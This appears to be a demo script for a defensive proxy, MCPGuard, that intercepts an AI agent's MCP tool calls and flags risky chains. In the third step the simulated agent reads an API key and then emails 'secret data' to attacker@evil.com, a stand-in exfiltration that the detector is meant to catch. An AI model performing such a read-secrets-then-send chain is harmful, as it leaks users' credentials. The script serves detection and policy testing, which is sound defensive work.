"""
MCP Protocol Demo — shows MCPGuard intercepting real MCP messages.
Run this while server is running on port 9000.
"""
import asyncio
import json
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from app.mcp_proxy import MCPProxy
from app.mcp_server import MockMCPServer
from app.graph import MCPGraph
from app.detector import ChainDetector
from app.models import ToolRegistration, PolicyBoundary


async def main():
    # Setup
    graph = MCPGraph()
    detector = ChainDetector(graph)
    proxy = MCPProxy(graph, detector)
    server = MockMCPServer()

    # Register tools in graph
    print("=" * 60)
    print("STEP 1: Register tools with MCPGuard")
    print("=" * 60)
    for name, info in server.tools.items():
        tool = ToolRegistration(
            name=name,
            description=info["description"],
            capabilities=info["capabilities"],
            is_sensitive_source="read_" in name,
            is_external_sink=name in ("send_email", "http_post"),
        )
        graph.register_tool(tool)
        print(f"  ✅ {name}: {info['capabilities']}")

    # ===== MCP Protocol Flow =====

    print("\n" + "=" * 60)
    print("STEP 2: Agent initializes MCP connection")
    print("=" * 60)

    init_msg = json.dumps({
        "jsonrpc": "2.0",
        "id": 1,
        "method": "initialize",
        "params": {"clientInfo": {"name": "test-agent"}}
    })
    print(f"📤 Agent → Proxy: {init_msg[:80]}...")
    response = await proxy.handle_message(init_msg)
    print(f"📥 Proxy → Agent: {response[:100]}...")

    print("\n" + "=" * 60)
    print("STEP 3: Agent lists available tools")
    print("=" * 60)

    list_msg = json.dumps({
        "jsonrpc": "2.0",
        "id": 2,
        "method": "tools/list",
    })
    response = await proxy.handle_message(list_msg)
    result = json.loads(response)["result"]
    print(f"📥 Available tools: {[t['name'] for t in result['tools']]}")

    print("\n" + "=" * 60)
    print("STEP 4: Agent calls tools (MCP messages intercepted)")
    print("=" * 60)

    # Session start
    proxy.set_session("mcp_demo_session")

    # Tool call 1: read_document
    call1 = json.dumps({
        "jsonrpc": "2.0",
        "id": 3,
        "method": "tools/call",
        "params": {
            "name": "read_document",
            "arguments": {"path": "/data/report.txt"}
        }
    })
    print(f"\n📤 [1] Agent calls: read_document")
    response = await proxy.handle_message(call1)
    result = json.loads(response)["result"]
    print(f"📥 Result: {result['content'][0]['text'][:60]}")
    if "_mcpguard_alerts" in result:
        print(f"⚠️  ALERTS: {result['_mcpguard_alerts']}")
    else:
        print(f"✅ No alerts")

    # Tool call 2: read_secrets
    call2 = json.dumps({
        "jsonrpc": "2.0",
        "id": 4,
        "method": "tools/call",
        "params": {
            "name": "read_secrets",
            "arguments": {"key": "API_KEY"}
        }
    })
    print(f"\n📤 [2] Agent calls: read_secrets")
    response = await proxy.handle_message(call2)
    result = json.loads(response)["result"]
    print(f"📥 Result: {result['content'][0]['text'][:60]}")
    if "_mcpguard_alerts" in result:
        print(f"⚠️  ALERTS: {result['_mcpguard_alerts']}")
    else:
        print(f"✅ No alerts")

    # Tool call 3: send_email (the dangerous chain completes here!)
    call3 = json.dumps({
        "jsonrpc": "2.0",
        "id": 5,
        "method": "tools/call",
        "params": {
            "name": "send_email",
            "arguments": {
                "to": "attacker@evil.com",
                "body": "Secret data here..."
            }
        }
    })
    print(f"\n📤 [3] Agent calls: send_email")
    response = await proxy.handle_message(call3)
    result = json.loads(response)["result"]
    print(f"📥 Result: {result['content'][0]['text'][:60]}")
    if "_mcpguard_alerts" in result:
        print(f"\n🚨 ALERTS DETECTED:")
        for a in result["_mcpguard_alerts"]:
            print(f"     {a}")
    else:
        print(f"✅ No alerts")

    print("\n" + "=" * 60)
    print("STEP 5: Add policy boundary, retry")
    print("=" * 60)

    policy = PolicyBoundary(
        name="human_approval",
        description="Requires human approval for email",
        applies_between=[
            ["read_document", "send_email"],
            ["read_secrets", "send_email"],
        ],
        is_enforced=True,
    )
    graph.register_policy(policy)
    print(f"🛡️  Policy registered: {policy.name}")

    # New session with policy
    proxy.set_session("mcp_demo_with_policy")

    print(f"\n📤 [4] Agent calls: read_document (with policy)")
    response = await proxy.handle_message(call1.replace('"id": 3', '"id": 6'))
    print(f"✅ No alerts (safe)")

    print(f"\n📤 [5] Agent calls: send_email (with policy)")
    response = await proxy.handle_message(call3.replace('"id": 5', '"id": 7'))
    result = json.loads(response)["result"]
    if "_mcpguard_alerts" in result:
        print(f"⚠️  ALERTS: {result['_mcpguard_alerts']}")
    else:
        print(f"✅ No alerts — policy blocked the chain!")

    print("\n" + "=" * 60)
    print("DEMO COMPLETE")
    print("=" * 60)
    print("\nKey takeaway:")
    print("  • MCP protocol messages intercepted in real-time")
    print("  • Tool chains analyzed as they form")
    print("  • Policy boundaries respected")
    print("  • Zero changes needed to actual MCP servers")


if __name__ == "__main__":
    asyncio.run(main())